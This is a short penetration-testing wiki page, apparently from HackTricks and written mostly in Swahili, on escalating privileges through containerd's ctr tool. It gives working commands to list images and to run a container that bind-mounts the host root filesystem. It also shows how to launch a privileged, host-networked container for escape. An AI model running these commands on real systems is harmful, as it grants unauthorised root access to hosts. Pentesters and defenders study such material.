# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya msingi

Nenda kwenye kiungo kifuatacho ili kujifunza **containerd na `ctr` zina nafasi gani kwenye container stack**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

ukigundua kuwa host ina command ya `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Unaweza kuorodhesha picha:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Na kisha **endesha mojawapo ya hizo images uki-mount folda ya root ya host ndani yake**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Endesha container yenye privileged na utoke ndani yake.\
Unaweza kuendesha container yenye privileged kama ifuatavyo:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Kisha unaweza kutumia baadhi ya mbinu zilizotajwa katika ukurasa ufuatao ili **escape kutoka humo kwa kutumia vibaya privileged capabilities**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
